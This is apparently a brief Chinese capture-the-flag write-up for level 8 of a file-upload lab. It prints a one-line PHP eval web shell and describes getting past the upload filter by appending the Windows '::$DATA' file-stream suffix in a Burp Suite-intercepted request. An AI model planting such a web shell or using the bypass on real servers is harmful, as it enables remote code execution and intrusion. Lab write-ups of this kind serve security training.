## 解题wp(By:独立团孙德胜Alan)
本pass可以通过增加点的方式绕过

## 1.打开第八关

![](./img/1.png)

## 2.上传一个普通的shell.php文件

```
<?php @eval($_POST('Alan'));?>
```

![](./img/2.png)

#### 提示不允许上传

## 3.分析代码

![](./img/3.png)

#### ::$DATA 利用 Windows文件流特性绕过

## 4.我们可以使用Burpsutie抓包，利用windows文件流特性绕过

![](/img/4.png)

